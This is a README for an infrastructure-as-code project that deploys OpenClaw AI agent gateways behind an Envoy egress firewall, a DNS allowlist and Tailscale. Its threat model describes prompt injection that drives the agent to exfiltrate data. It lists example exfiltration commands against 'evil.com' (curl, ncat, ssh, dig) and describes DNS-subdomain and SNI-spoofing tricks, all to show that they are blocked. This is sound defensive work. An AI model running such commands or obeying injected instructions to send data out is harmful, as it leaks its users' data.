# openclaw-deploy

[![TypeScript](https://img.shields.io/badge/TypeScript-5.9-3178C6?logo=typescript&logoColor=white)](https://www.typescriptlang.org)
[![Pulumi](https://img.shields.io/badge/Pulumi-IaC-8A3391?logo=pulumi&logoColor=white)](https://www.pulumi.com)
[![OpenClaw](https://img.shields.io/badge/OpenClaw-supported-6E56CF)](https://docs.openclaw.ai)
[![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/schmitthub/openclaw-docker)

Pulumi TypeScript IaC that provisions remote VPS hosts and deploys [OpenClaw](https://openclaw.ai) gateway fleets with network-level egress isolation via Envoy proxy and Tailscale networking.

What this gets you above the official sandboxed docker compose offering:

- One-click deployment of OpenClaw to an actual low cost VPS gateway on Hetzner, DigitalOcean, or Oracle Cloud
- Tailscale sidecar for secure access and TLS certificate management (no reverse proxy or manual certs needed)
- Firewall via Envoy sidecar for egress filtering with a structured policy engine (blocks unauthorized TCP exfiltration)
- DNS exfiltration prevention via CoreDNS allowlist proxy — only whitelisted domains resolve, everything else returns NXDOMAIN (forwarded through Cloudflare malware-blocking DNS)
- Firewall escape hatch — grant the agent temporary full internet access for any one-off destination using a convenient ssh one-liner from your machine (auto-closes after 30s by default; the agent already knows to ask for this when it hits blocked destinations)
- Auto-injected agent environment prompt — the agent understands its constraints out of the box so it knows when to ask, what to ask, and what options it has at its disposal when it comes to tool use, gateway management, and outbound requests

> Early development — features and conventions may change. Contributions and feedback welcome!

## Table of Contents

- [openclaw-deploy](#openclaw-deploy)
  - [Table of Contents](#table-of-contents)
  - [Try it: Deploy OpenClaw with Telegram and Private Discord server access](#try-it-deploy-openclaw-with-telegram-and-private-discord-server-access)
    - [1) Create your `.env` file](#1-create-your-env-file)
    - [0) Optional Dockerhub Setup (Recommended)](#0-optional-dockerhub-setup-recommended)
    - [2) Register accounts and create API credentials](#2-register-accounts-and-create-api-credentials)
      - [OpenRouter](#openrouter)
      - [Tailscale](#tailscale)
      - [Hetzner Cloud](#hetzner-cloud)
      - [Discord](#discord)
      - [Telegram](#telegram)
      - [Brave Search API](#brave-search-api)
      - [Pulumi](#pulumi)
    - [3) Set up and initialize the Pulumi stack](#3-set-up-and-initialize-the-pulumi-stack)
    - [4) Set provider and secret config in Pulumi](#4-set-provider-and-secret-config-in-pulumi)
    - [5) Deploy and verify](#5-deploy-and-verify)
    - [6) Post-deploy operational notes](#6-post-deploy-operational-notes)
  - [Architecture](#architecture)
  - [Threat Model](#threat-model)
  - [Prerequisites](#prerequisites)
  - [Quickstart](#quickstart)
  - [Stack Configuration](#stack-configuration)
  - [Component Hierarchy](#component-hierarchy)
  - [Egress Domain Whitelist](#egress-domain-whitelist)
  - [Firewall Bypass (SOCKS Proxy)](#firewall-bypass-socks-proxy)
  - [DNS Exfiltration Prevention](#dns-exfiltration-prevention)
  - [Agent Environment Prompt](#agent-environment-prompt)
  - [Docker Hub Build Mode](#docker-hub-build-mode)
  - [Experimental Runtime Binary Persistence](#experimental-runtime-binary-persistence)

## Try it: Deploy OpenClaw with Telegram and Private Discord server access

This is an end-to-end setup guide for deploying a personal OpenClaw gateway with Telegram and private Discord access. Hetzner is the most tested provider in this repo (and cheap, roughly $4/month); DigitalOcean and OCI support exist but are less battle-tested here.

OpenClaw setup is a nightmare and after 20+ years in tech it was the most painful buggy nonsensical frustrating experience I've had to date... so hopefully my work adds the years back onto your life that I lost from the stress of figuring it out.

If you want additional OpenClaw onboarding tips after deployment, this guide is useful:
<https://amankhan1.substack.com/p/how-to-make-your-openclaw-agent-useful>

A good first prompt to your agent is:

- "Hey, let's get you set up. Read BOOTSTRAP.md and walk me through it."
- "When I ask questions in Discord channels, use memory_search or memory_get if you need long-term context from MEMORY.md."

OpenClaw platform references:

- Hetzner (tested, recommended): <https://docs.openclaw.ai/install/hetzner>
- DigitalOcean (untested, you can try it): <https://docs.openclaw.ai/platforms/digitalocean>
- Oracle (tested, but free-tier capacity is often unavailable): <https://docs.openclaw.ai/platforms/oracle>

### 1) Create your `.env` file

Create a local `.env` file first and keep it updated as you complete each credential step below:

```env
OPENROUTER_API_KEY=
DISCORD_SERVER_ID=
DISCORD_USER_ID=
DISCORD_BOT_TOKEN=
BRAVE_API_KEY=
TS_AUTHKEY=
OCI_TENANCY_ID=
OCI_USER_ID=
HCLOUD_TOKEN=
TELEGRAM_BOT_TOKEN=
TELEGRAM_USER_ID=
# Optional if using `dockerhubPush: true` in your Pulumi stack config
DOCKER_REGISTRY_REPO=
DOCKER_REGISTRY_USER=
DOCKER_REGISTRY_PASS=
```

### 0) Optional Dockerhub Setup (Recommended)

I highly recommend using Docker Hub to push your image to. It makes deployments siginficantly faster over having to build the image on a smaller VPS frequently, and it avoids ugly cache cleanup that builds up on your server and eats away at your disk space.

- Create an account on <https://hub.docker.com/>
- In your "My Hub" page Create a Repository, for example "openclaw"
- Set it to private, but public should be okay too it'll just contain your customizations but shouldn't have any secrets in it by default, but do at your own risk.
- If you chose private: click your profile icon in the top right, go to "Account Settings" > "Personal access tokens" > "Generate new token" with Read,Write,Delete permissions.

Save the repository name (ex: `yourusername/openclaw`), your Docker Hub username, and the generated token to your `.env` file as `DOCKER_REGISTRY_REPO`, `DOCKER_REGISTRY_USER`, and `DOCKER_REGISTRY_PASS` respectively.

### 2) Register accounts and create API credentials

> Tip: As you complete each subsection, immediately paste values into your `.env` file.

#### OpenRouter

- **Sign up:** Visit [https://openrouter.ai/](https://openrouter.ai/) and create an account.
- **Customize Autorouter:** Go to [routing settings](https://openrouter.ai/settings/routing) and update your defaults.

> OpenRouter's default autorouter picks tiny models that underperform during onboarding and long-context instruction following. For me it chose GPT-5 Nano; during setup openclaw literally misspelled `IDENTITY.md` as `IDENTIY.md` when trying to save the file; and then kept missing basic setup instructions. It called me by the name I gave it, and would forget what we were talking about after one or two messages. Curating the autorouter list up front made reliability way better.

```
minimax/minimax-m2.5
google/gemini-3-flash-preview
google/gemini-3.1-pro-preview
anthropic/*
moonshotai/kimi-k2.5
deepseek/deepseek-v3.2
openai/gpt-5.2
google/gemini-3.1-pro-preview
```

> Practical note: if you're budget-sensitive, avoid adding frontier models (anthropic, openai) and watch usage for the first few days. The goal is to avoid surprise routing while keeping quality high enough for setup and day-to-day agent work. Personally openrouter now almost always chooses minimax and while its no Opus or GPT-5, its well worth the price. I used sonnet 4.6 to get through onboarding and after 10 mins it cost me like $7. I have been using minimax every since, several days now, and it has only cost me about $3.

- **Get API key:** Go to [https://openrouter.ai/settings/keys](https://openrouter.ai/settings/keys), create a key, and save it to `.env` as `OPENROUTER_API_KEY`.

#### Tailscale

- **Sign up:** Create an account at [https://login.tailscale.com/start](https://login.tailscale.com/start).
- **Create tag:** In [Access Controls > Tags](https://login.tailscale.com/admin/acls/visual/tags), create a tag such as `tag:openclaw`. I made the owner `autogroup:admin` not sure if thats needed or the safest option but you only live once said most of the people who are no longer living.
- **Create auth key:** In [keys settings](https://login.tailscale.com/admin/settings/keys), create a reusable ephemeral auth key with that tag and save it to `.env` as `TS_AUTHKEY`.
- **Set up SSH ACL (optional):** If SSH login fails, add this rule in [Tailscale SSH ACLs](https://login.tailscale.com/admin/acls/visual/tailscale-ssh):

```json
{
  "src": ["autogroup:admin", "autogroup:owner"],
  "dst": ["tag:openclaw"],
  "users": ["autogroup:nonroot", "root", "node"],
  "action": "accept"
}
```

- **Enable HTTPS certs:** In [DNS settings](https://login.tailscale.com/admin/dns), enable HTTPS certificates. This is required for Tailscale Serve.
- **Start Tailscale on your machine:** [Install Tailscale CLI](https://tailscale.com/docs/install) and run `tailscale up`.

#### Hetzner Cloud

- Sign up at <https://console.hetzner.cloud>
- Create a project (for example, `openclaw`).
- From the project screen on the lefthand side click **Security** then the tab **API Tokens**.
- Generate a **Read & Write** token and save it to `.env` as `HCLOUD_TOKEN`.

#### Discord

> WARNING: **TLDR; Use Telegram for back and forth chatting and tool executions etc; use Discord only for outgoing reporting and alerts (ie "schedule a task to run every hour to check the top tweets on facebook, send a summary to discord serverid/channelid (ie a 'trending' text channel on the discord server)".** Openclaw's Discord integration is in a broken state. There are several open issues regarding websocket drops triggered by abnormal closures, in my experience it happens almost right away if you start talking to it and especially when you want it to execute something. The gateway gets stuck in a reconnect loop, loses session ids over and over again, and spams logs. In that state, tools over Discord stop working (it will still talk back via HTTPS), and the internal logger and event spam will eventually disrupt scheduled cron jobs until you restart the whole container process.

- Set up your Discord bot and private server using: <https://docs.openclaw.ai/channels/discord#quick-setup>
- Stop after you have the bot token, server ID (aka guild ID), and your user ID. Pulumi will handle the rest

Save the following to your `.env` file as soon as you have them:

```env
DISCORD_SERVER_ID=
DISCORD_USER_ID=
DISCORD_BOT_TOKEN=
```

#### Telegram

Telegram is a reliable baseline interface and often more stable than Discord.

- Log into telegram
- Create a bot by messaging [BotFather](https://t.me/botfather) and save the token to `.env` as `TELEGRAM_BOT_TOKEN`.
- Get your user ID via [userinfobot](https://t.me/userinfobot) and save it to `.env` as `TELEGRAM_USER_ID`.

#### Brave Search API

This is needed for the web search tool.

- Register at [https://api-dashboard.search.brave.com/register](https://api-dashboard.search.brave.com/register)
- Go to [https://api-dashboard.search.brave.com/app/subscriptions/subscribe](https://api-dashboard.search.brave.com/app/subscriptions/subscribe) and subscribe to Search
- Go to [https://api-dashboard.search.brave.com/app/keys](https://api-dashboard.search.brave.com/app/keys) and create a new API key for your search subscription. Save it to `.env` as `BRAVE_API_KEY`.

#### Pulumi

Create and configure your Pulumi account:

- [Create](https://app.pulumi.com/signup) a Pulumi account (free tier is enough for this project). Switch to **individual** after signing in.
- [Install Pulumi CLI](https://www.pulumi.com/docs/get-started/download-install/) and authenticate from your operator machine (`pulumi login`).

### 3) Set up and initialize the Pulumi stack

Copy `Pulumi.dev.yaml.example` to `Pulumi.<your-fave-name>.yaml`.

The default gateway profile is `main`. You can rename it if desired.

Install dependencies and initialize/select a stack:

```bash
# From repo root
npm install

# if you haven't already...
pulumi login

# Create/select stack, call it whatever you want...
pulumi stack init openclaw
pulumi stack select openclaw
```

### 4) Set provider and secret config in Pulumi

This is assuming you have set the environment variables collected in your `.env` file:

```bash
# Hetzner provider token
pulumi config set --stack openclaw --secret hcloud:token $HCLOUD_TOKEN

# Tailscale auth key used inside the gateway container
pulumi config set --secret tailscaleAuthKey $TS_AUTHKEY

# Secret env passed to setupCommands and runtime container env
pulumi config set --secret gatewaySecretEnv-main "{\"OPENROUTER_API_KEY\":\"$OPENROUTER_API_KEY\",\"BRAVE_API_KEY\":\"$BRAVE_API_KEY\",\"DISCORD_BOT_TOKEN\":\"$DISCORD_BOT_TOKEN\",\"DISCORD_USER_ID\":\"$DISCORD_USER_ID\",\"DISCORD_SERVER_ID\":\"$DISCORD_SERVER_ID\",\"TELEGRAM_BOT_TOKEN\":\"$TELEGRAM_BOT_TOKEN\",\"TELEGRAM_USER_ID\":\"$TELEGRAM_USER_ID\"}"
```

### 5) Deploy and verify

```bash
pulumi preview --stack openclaw # review planned resource changes

pulumi up --stack openclaw # apply changes after confirming
```

Pulumi will show an interactive progress view. The `Gateway` resources usually take the longest because they build images and run init commands. I've done some optimizations to speed this up but it still takes a few minutes. Just grab a coffee and be grateful you don't have to do all of this manually.

After deployment, run:

```bash
pulumi stack output gatewayServices --show-secrets # shows service urls w/ gateway token, SSH command
```

> First request using any new tailnet host will take a few seconds to a minute while Tailscale generates TLS certificates for HTTPS handlers. It doesn't trigger until first request, but after that it should be smooth sailing.

- `https://<device_tailnetid>.ts.net#token=<gateway-token>` for Control UI (token needed on first visit)
- Find your tailnet hostname in Tailscale **Devices** or in Pulumi output `gatewayServices`.
- `https://<device_tailnetid>.ts.net/browse/` for File Browser.
- `ssh root@<device_tailnetid>.ts.net` for SSH access (forwarded to gateway sshd).

If all goes well, you now have an operational OpenClaw gateway with Tailscale access, Envoy egress filtering, and runtime binary persistence.

### 6) Post-deploy operational notes

- If you install runtime binaries or change config, restart the gateway container. `openclaw gateway restart` will not work in this deployment model. Use SSH and run: `ssh root@main.yourtsns.ts.net "kill 1"`.
- To add a domain to the Envoy whitelist, update `egressPolicy` and run `pulumi up` again. Firewall updates only take a few seconds to a minute to propogate.
- For one-off downloads without updating the whitelist, SSH in as root and use the firewall bypass: `ssh root@main.yourtsns.ts.net "firewall-bypass 30"` then from inside the container: `curl --socks5 localhost:9100 https://example.com/file.tar.gz -o file.tar.gz`. Your agent will already know about this and will most likely ask you if it can use the bypass when it encounters blocked destinations.
- If you want a config value to persist across rebuilds, keep it in `setupCommands`.
- Removing a `setupCommands` entry does not unset an already-written OpenClaw config value. Unset it manually, then restart the container.

## Architecture

```
┌──────────────────────────────────────────────────────────────────────┐
│  Remote VPS (Hetzner / DigitalOcean / Oracle Cloud)                  │
│                                                                      │
│   Per gateway: 1 bridge network + 3 containers (shared netns)        │
│                                                                      │
│   ┌──────────────────────────────────────────────────────────────┐   │
│   │  openclaw-net-<profile> (bridge network)                     │   │
│   │                                                              │   │
│   │   ┌────────────────────────────────────────────────────┐     │   │
│   │   │  tailscale-<profile> (sidecar — owns netns)        │     │   │
│   │   │  • Tailscale containerboot (official entrypoint)   │     │   │
│   │   │  • TS_SERVE_CONFIG → serve-config.json             │     │   │
│   │   │  • iptables REDIRECT (root-owned, immutable)       │     │   │
│   │   │  • dns: [1.1.1.2, 1.0.0.2] (Cloudflare)           │     │   │
│   │   │  • /dev/net/tun (kernel networking)                │     │   │
│   │   │                                                    │     │   │
│   │   │  sidecar-entrypoint.sh (runs before containerboot):│     │   │
│   │   │  ┌──────────────────────────────────────────────┐  │     │   │
│   │   │  │ NAT: RETURN for uid 101 (envoy)              │  │     │   │
│   │   │  │ NAT: RETURN for uid 0 (root/containerboot)   │  │     │   │
│   │   │  │ NAT: SSH/TCP → REDIRECT :10001+ (per-rule)   │  │     │   │
│   │   │  │ NAT: DNS 53 (UDP+TCP) uid 1000 → :5300       │  │     │   │
│   │   │  │ NAT: ALL TCP → REDIRECT :10000 (catch-all)   │  │     │   │
│   │   │  │ UDP: ACCEPT Docker DNS (127.0.0.11)          │  │     │   │
│   │   │  │ UDP: ACCEPT CoreDNS (loopback:5300)          │  │     │   │
│   │   │  │ UDP: ACCEPT root (containerboot)             │  │     │   │
│   │   │  │ UDP: DROP all others                         │  │     │   │
│   │   │  │ exec containerboot (Tailscale entrypoint)    │  │     │   │
│   │   │  └──────────────────────────────────────────────┘  │     │   │
│   │   │                                                    │     │   │
│   │   │  ┌──────────────────────────────────────────────┐  │     │   │
│   │   │  │  envoy-<profile> (network_mode: container:)  │  │     │   │
│   │   │  │                                              │  │     │   │
│   │   │  │  TLS (:10000):                               │  │     │   │
│   │   │  │  • TLS Inspector (SNI) + domain whitelist    │  │     │   │
│   │   │  │  • MITM inspection (optional per-rule)       │  │     │   │
│   │   │  │                                              │  │     │   │
│   │   │  │  SSH/TCP (:10001+):                          │  │     │   │
│   │   │  │  • Per-rule tcp_proxy (STRICT_DNS / STATIC)  │  │     │   │
│   │   │  └──────────────────────────────────────────────┘  │     │   │
│   │   │                                                    │     │   │
│   │   │  ┌──────────────────────────────────────────────┐  │     │   │
│   │   │  │  openclaw-<profile> (network_mode: container:)│  │     │   │
│   │   │  │  • OpenClaw + pnpm + bun + brew + uv         │  │     │   │
│   │   │  │  • CoreDNS on :5300 (DNS allowlist proxy)    │  │     │   │
│   │   │  │  • sshd on :2222 (loopback)                  │  │     │   │
│   │   │  │  • No CAP_NET_ADMIN, no iptables             │  │     │   │
│   │   │  └──────────────────────────────────────────────┘  │     │   │
│   │   └────────────────────────────────────────────────────┘     │   │
│   │              ... (N gateways per server)                     │   │
│   └──────────────────────────────────────────────────────────────┘   │
│                                                                      │
│   Tailscale Serve exposes per gateway:                               │
│     • HTTPS :443 /        → http://127.0.0.1:18789 (Control UI)  │
│     • HTTPS :443 /browse/   → http://127.0.0.1:8080 (File Browser)  │
│     • SSH :22 → 127.0.0.1:2222 (sshd in gateway)                    │
│                                                                      │
│   Docker daemon (provisioned by HostBootstrap)                       │
└──────────────────────────────────────────────────────────────────────┘

Operator machine:
  $ pulumi up --stack dev     # provisions server + deploys everything
  $ pulumi destroy --stack dev  # tears down
```

One Pulumi stack = one server. Each server runs N gateway instances, each with a dedicated Tailscale sidecar + Envoy egress proxy. All three containers per gateway share a single network namespace owned by the sidecar. Tailscale Serve handles ingress (HTTPS for Control UI, File Browser at `/browse/`, SSH for terminal access). No self-managed TLS certificates or reverse proxies.

Gateway containers mount the OpenClaw runtime home and Linuxbrew data paths as named Docker volumes so runtime-installed binaries persist across container recreation. This is intentionally experimental and trades container purity for operational flexibility.

## Threat Model

**Threat:** Prompt injection coerces the AI agent into exfiltrating data. The agent can run any tool available in the container — `curl`, `wget`, `ncat`, `ssh`, raw sockets, subprocesses. It can use any port, any protocol, and target any destination. Application-level proxy settings (`HTTP_PROXY`) are trivially bypassed.

**Defense-in-depth (five layers):**

| Layer                                 | Mechanism                                                                       | What it stops                                         | Bypassable by `node` user?                         |
| ------------------------------------- | ------------------------------------------------------------------------------- | ----------------------------------------------------- | -------------------------------------------------- |
| **1. iptables REDIRECT + UDP DROP**   | Root-owned rules in sidecar: SSH/TCP → specific Envoy ports, all TCP → :10000   | Every TCP connection goes through Envoy               | No (`CAP_NET_ADMIN` required, sidecar only)        |
| **2. Envoy protocol-aware whitelist** | TLS: SNI inspection + domain whitelist. SSH/TCP: per-rule port-mapped listeners | Non-whitelisted HTTPS, non-mapped SSH/TCP, plain HTTP | No (Envoy resolves DNS independently)              |
| **3. Egress policy engine**           | Typed `EgressRule[]` with domain/IP + protocol support (TLS, SSH, TCP)          | Structured policy control with per-protocol handling  | No (Envoy config, not in container)                |
| **4. CoreDNS allowlist proxy**        | iptables redirects uid 1000 DNS to CoreDNS; only whitelisted domains resolve    | DNS exfiltration via encoded subdomain queries        | No (iptables redirect + CoreDNS runs as root)      |
| **5. Malware-blocking DNS**           | Cloudflare 1.1.1.2 / 1.0.0.2 as CoreDNS upstream + sidecar `dns:` config        | Known malware, phishing, and C2 domains               | No (Docker DNS config, containers cannot override) |

**UDP exfiltration prevention:** The sidecar's iptables rules redirect DNS (UDP and TCP port 53) from uid 1000 to CoreDNS, allow Docker DNS (127.0.0.11) for other users, allow root-owned UDP (containerboot/tailscaled for WireGuard), and DROP all other UDP. The `node` user cannot send unfiltered UDP.

**Why SNI spoofing doesn't work:** If an attacker forges the SNI to `api.anthropic.com` while connecting to `evil.com`'s IP, Envoy resolves `api.anthropic.com` via DNS independently and connects to the **real** IP — not the attacker's server.

**What gets blocked / allowed:**

- `curl https://evil.com` — SNI not in whitelist → **BLOCKED**
- `ssh user@evil.com` — no SSH egress rule configured → **BLOCKED**
- `ssh git@github.com` — SSH rule with port 22 in egressPolicy → **ALLOWED** (via dedicated Envoy listener)
- `ncat evil.com 4444` — no matching TCP rule → **BLOCKED**
- `python3 -c "import socket; s.connect(('1.2.3.4', 443))"` — no SNI → **BLOCKED**
- `curl https://api.anthropic.com` — SNI matches whitelist → **ALLOWED**
- `dig evil.com` — DNS redirected to CoreDNS, not whitelisted → **NXDOMAIN**
- `dig @8.8.8.8 evil.com` — iptables catches hardcoded resolver, still CoreDNS → **NXDOMAIN**

## Prerequisites

- [Node.js](https://nodejs.org/) (v18+)
- [Pulumi CLI](https://www.pulumi.com/docs/install/)
- [Tailscale](https://tailscale.com/) account with an auth key
- A VPS provider account with an SSH key uploaded: [Hetzner Cloud](https://www.hetzner.com/cloud), [DigitalOcean](https://www.digitalocean.com/), or [Oracle Cloud](https://www.oracle.com/cloud/)

## Quickstart

```bash
# Clone and install
git clone https://github.com/schmitthub/openclaw-docker.git openclaw-deploy
cd openclaw-deploy
npm install

# Initialize a stack
pulumi stack init dev
cp Pulumi.dev.yaml.example Pulumi.dev.yaml

# Set required secrets
pulumi config set --secret tailscaleAuthKey <your-tailscale-auth-key>

# Edit Pulumi.dev.yaml with your server config, egress policy, and gateway profiles

# Deploy
pulumi up
```

`pulumi up` will:

1. Provision a VPS (Hetzner, DigitalOcean, or Oracle Cloud)
2. Install Docker + fail2ban on the host
3. Render Envoy config + generate TLS certificates
4. Build gateway Docker images and deploy containers (sidecar + envoy + gateway per profile)
5. Configure each gateway via ephemeral init container
6. Tailscale Serve auto-configured via `TS_SERVE_CONFIG` (HTTPS + SSH)

## Stack Configuration

Configuration lives in `Pulumi.<stack>.yaml`. See `Pulumi.dev.yaml.example` for a complete example.

| Key                          | Type                                          | Required | Description                                             |
| ---------------------------- | --------------------------------------------- | -------- | ------------------------------------------------------- |
| `provider`                   | `"hetzner"` \| `"digitalocean"` \| `"oracle"` | yes      | VPS provider                                            |
| `serverType`                 | string                                        | yes      | Server type (e.g. `cx22`, `cax21`)                      |
| `region`                     | string                                        | yes      | Datacenter region (e.g. `fsn1`)                         |
| `sshKeyId`                   | string                                        | no       | SSH key ID at provider (auto-generated if omitted)      |
| `tailscaleAuthKey`           | secret                                        | yes      | One-time Tailscale auth key                             |
| `egressPolicy`               | `EgressRule[]`                                | yes      | User egress rules (additive to hardcoded)               |
| `gateways`                   | `GatewayConfig[]`                             | yes      | Gateway profile definitions (1+)                        |
| `dockerhubPush`              | boolean                                       | no       | Build locally and push to Docker Hub (default: `false`) |
| `gatewayToken-<profile>`     | secret                                        | no       | Auth token override (auto-generated if omitted)         |
| `gatewaySecretEnv-<profile>` | secret                                        | no       | JSON `{"KEY":"value"}` env vars for init + runtime      |

**Gateway profile fields:**

| Field            | Type        | Description                                                                   |
| ---------------- | ----------- | ----------------------------------------------------------------------------- |
| `profile`        | string      | Unique name (used in resource names)                                          |
| `version`        | string      | OpenClaw version (`latest` or semver)                                         |
| `port`           | number      | Gateway port (e.g. `18789`)                                                   |
| `installBrowser` | boolean     | Install Chromium + Xvfb; auto-sets `browser.headless` and `browser.noSandbox` |
| `imageSteps`     | ImageStep[] | Custom Dockerfile RUN instructions (`{run}` pairs, always root)               |
| `setupCommands`  | string[]    | OpenClaw subcommands run in init container (e.g. `onboard`)                   |
| `env`            | object      | Extra environment variables                                                   |

## Component Hierarchy

Components compose sequentially — each depends on the previous:

```
Server (VPS provisioning: Hetzner / DigitalOcean / Oracle)
  ↓ connection (public IP SSH)
HostBootstrap (Docker + fail2ban install)
  ↓ dockerHost (public IP SSH)
EnvoyEgress (config rendering + cert generation — no Docker resources)
  ↓ envoyConfigPath, envoyConfigHash, inspectedDomains
Gateway(s) (1+ per server: bridge network + sidecar + envoy + gateway containers)
  ↓ Tailscale Serve (HTTPS + SSH via TS_SERVE_CONFIG)
```

| Component       | Pulumi Type                    | Provider                             | Purpose                                                                      |
| --------------- | ------------------------------ | ------------------------------------ | ---------------------------------------------------------------------------- |
| `Server`        | `openclaw:infra:Server`        | `@pulumi/hcloud` / DO / OCI          | Provision VPS, expose IP + SSH connection                                    |
| `HostBootstrap` | `openclaw:infra:HostBootstrap` | `@pulumi/command`                    | Install Docker + fail2ban on bare host                                       |
| `EnvoyEgress`   | `openclaw:infra:EnvoyEgress`   | `@pulumi/command`                    | Render envoy.yaml, upload config, generate CA + MITM certs                   |
| `Gateway`       | `openclaw:app:Gateway`         | `@pulumi/docker` + `@pulumi/command` | Create bridge network, sidecar, envoy, gateway containers; configure gateway |

## Egress Domain Whitelist

Envoy enforces protocol-aware egress filtering: TLS connections are filtered by SNI whitelist, SSH/TCP connections are forwarded via per-rule dedicated listeners, and all other traffic is denied.

**Always included (hardcoded, cannot be removed):**

| Category       | Domains                                                                                                                |
| -------------- | ---------------------------------------------------------------------------------------------------------------------- |
| Infrastructure | `clawhub.com`, `registry.npmjs.org`                                                                                    |
| AI providers   | `api.anthropic.com`, `api.openai.com`, `generativelanguage.googleapis.com`, `openrouter.ai`, `api.x.ai`                |
| Homebrew       | `github.com`, `*.githubusercontent.com`, `ghcr.io`, `formulae.brew.sh`                                                 |
| Tailscale      | `*.tailscale.com` (wildcard — covers control plane, DERP relays, all subdomains), `*.api.letsencrypt.org` (ACME certs) |

User-defined `egressPolicy` rules are **additive** — hardcoded domains are always present. Duplicates are deduplicated by `mergeEgressPolicy()`.

```yaml
# Example: TLS domains, SSH access, and TCP database
openclaw-deploy:egressPolicy:
  - dst: "discord.com"
    proto: tls
    action: allow
  - dst: "gateway.discord.gg"
    proto: tls
    action: allow
  - dst: "cdn.discordapp.com"
    proto: tls
    action: allow
  - dst: "github.com"
    proto: ssh
    port: 22
    action: allow
  - dst: "db.example.com"
    proto: tcp
    port: 5432
    action: allow
```

SSH/TCP rules use per-rule port mapping: each rule gets a dedicated Envoy listener port (starting from 10001), and destination-specific iptables REDIRECT rules in the sidecar entrypoint route matching traffic to the correct port. Domain resolution happens at container startup.

## Firewall Bypass (SOCKS Proxy)

The Envoy egress whitelist requires `pulumi up` to add new domains. For one-off requests this is cumbersome. The `firewall-bypass` script (root-only, chmod 700) starts a temporary SSH SOCKS proxy so your agent can reach any destination temporarily without modifying iptables or the egress policy. Your agent will already know to ask you to open the bypass (or add a permanent whitelist entry) and how to make an outbound request when it encounters blocked destinations.

**How it works:** The script runs `ssh -D 127.0.0.1:9100 -f -N root@127.0.0.1 -p 2222`. Since the SSH process runs as root (uid 0), its outbound traffic hits the iptables `RETURN` rule for root and bypasses the Envoy REDIRECT. No `CAP_NET_ADMIN`, no iptables changes.

```bash
# SSH into the gateway as root
ssh root@<device_tailnetdomain>.ts.net

# Start SOCKS proxy (default 30s timeout)
firewall-bypass

# Start with 2-minute timeout
firewall-bypass 120

# Check if proxy is active
firewall-bypass list

# Kill proxy immediately
firewall-bypass stop
```

Or as a one-liner from your operator machine:

```bash
ssh root@main.yourtsns.ts.net "firewall-bypass 30"
```

The proxy auto-kills after the timeout. PID is tracked in `/run/firewall-bypass.pid`. Re-running while active is idempotent (shows status and exits). The `node` user cannot execute the script (chmod 700).

## DNS Exfiltration Prevention

A CoreDNS allowlist proxy runs inside each gateway container, preventing the `node` user (uid 1000) from resolving non-whitelisted domains. This closes a DNS exfiltration vector where an attacker could encode data in subdomain queries to attacker-controlled domains.

**How it works:** The sidecar's iptables rules redirect all DNS queries (UDP and TCP port 53) from uid 1000 to CoreDNS on port 5300. CoreDNS only resolves domains on the same whitelist used by Envoy, forwarding allowed queries to Cloudflare's malware-blocking resolvers (1.1.1.2 / 1.0.0.2). Everything else gets NXDOMAIN. Root (uid 0) and Envoy (uid 101) bypass DNS filtering entirely — their queries go directly to Docker DNS.

Hardcoded resolvers (`dig @8.8.8.8`) are also caught by the iptables redirect. DNS-over-TLS (DoT, port 853) and DNS-over-HTTPS (DoH, port 443) are blocked by Envoy's SNI filter since resolver domains are not whitelisted. The firewall-bypass escape hatch is unaffected (runs as root).

## Agent Environment Prompt

Every deploy automatically writes an `ocdeploy/AGENTS.md` file into the agent's workspace (`/home/node/.openclaw/workspace/ocdeploy/AGENTS.md`) and loads it into the agent's context via the `bootstrap-extra-files` hook. This means your agent understands its operational constraints from the first message — no manual onboarding needed.

The prompt teaches the agent three things it can't figure out on its own:

1. **It can't restart itself.** `openclaw gateway restart` doesn't work in this deployment model. Instead of trying (and crashing), it asks you to restart the container.
2. **Config changes don't persist without Pulumi.** Instead of editing `openclaw.json` directly (which gets overwritten on next deploy), it gives you the exact `openclaw config set ...` command to add to your IaC.
3. **The firewall blocks almost everything.** Instead of failing silently or retrying network requests in a loop, it knows to either ask you to add a permanent whitelist entry (for recurring services) or ask you to open the SOCKS tunnel (for one-off downloads). It also knows to have its exact command ready before asking you to open the tunnel since the default window is only 30 seconds.

The file is root-owned and read-only (chmod 444) so the agent can't modify or delete it. It is re-deployed when the template content changes (Pulumi trigger on content hash).

## Docker Hub Build Mode

By default, gateway images are built directly on the VPS via `DOCKER_HOST=ssh://`. This works but has a known limitation: the `@pulumi/docker-build` provider creates an unmanaged BuildKit container on the VPS whose build cache accumulates over time and cannot be pruned via the Docker CLI ([pulumi/pulumi-docker-build#65](https://github.com/pulumi/pulumi-docker-build/issues/65)).

To avoid this, set `dockerhubPush: true` in your stack config. This builds images locally and pushes them to a private Docker Hub registry, then pulls them on the VPS. Build cache stays on your local machine where it's trivially manageable.

```yaml
openclaw-deploy:dockerhubPush: true
```

**Required environment variables** (when `dockerhubPush: true`):

| Variable               | Description                                                |
| ---------------------- | ---------------------------------------------------------- |
| `DOCKER_REGISTRY_REPO` | Docker Hub image repository (e.g. `yourusername/openclaw`) |
| `DOCKER_REGISTRY_USER` | Docker Hub username                                        |
| `DOCKER_REGISTRY_PASS` | Docker Hub access token                                    |

**If using the default SSH build mode** (`dockerhubPush: false`), build cache will accumulate on the VPS. To reclaim disk space, SSH into the VPS and run:

```bash
docker ps --filter name=buildx_buildkit -q \
  | xargs -r -I{} docker exec {} buildctl prune --keep-storage=2GB
docker image prune -f
```

## Experimental Runtime Binary Persistence

This project currently uses a non-standard, intentionally experimental container pattern to support runtime binary installs:

- The gateway creates a persistent named volume for the OpenClaw user home (`/home/node`).
- The gateway creates a persistent named volume for Linuxbrew data (`/home/linuxbrew/.linuxbrew`).

Why this exists: I want to test whether persistent user-space runtime installs (pnpm/brew/uv/etc.) are practical for gateway operations.

Why this is experimental: it is admittedly ugly and goes against normal immutable-container conventions. It is included deliberately while I evaluate the trade-offs.

Operational notes:

- On first run, Tailscale will register your gateway and assign it a random tailnet domain on your tailscale network. It can always be found in the Tailscale admin console. This domain changes every time you rebuild the stack or recreate the sidecar container (stopping/restarting does not change it).
- Gateway is not a daemon supervisor process; after installing a new binary, restart is required for predictable runtime behavior.
- From the host, you can SSH into the VPS host and restart with Docker (`docker restart openclaw-<profile>`) (ssh key is stored in Pulumi).
- For day-to-day remote access, SSH into the gateway via Tailscale: `ssh root@<device_tailnetdomain>.ts.net` (Tailscale Serve forwards port 22 to sshd on port 2222 inside the gateway).
